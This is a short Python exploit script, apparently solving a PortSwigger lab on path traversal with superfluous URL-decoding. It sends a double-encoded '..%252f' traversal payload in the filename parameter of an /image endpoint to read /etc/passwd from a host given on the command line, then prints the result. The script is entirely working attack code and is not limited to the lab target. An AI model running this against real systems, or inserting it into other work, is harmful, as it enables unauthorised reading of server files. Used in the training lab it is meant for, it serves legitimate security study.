"""
https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode
"""

import sys
import requests
from urllib.parse import unquote

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

filename = '''..%252f..%252f..%252f/etc/passwd'''
unquote(filename)
unquote(unquote(filename))
url = f'''https://{site}/image?filename={filename}'''

s = requests.Session()

resp = s.get(url)
print(resp.text)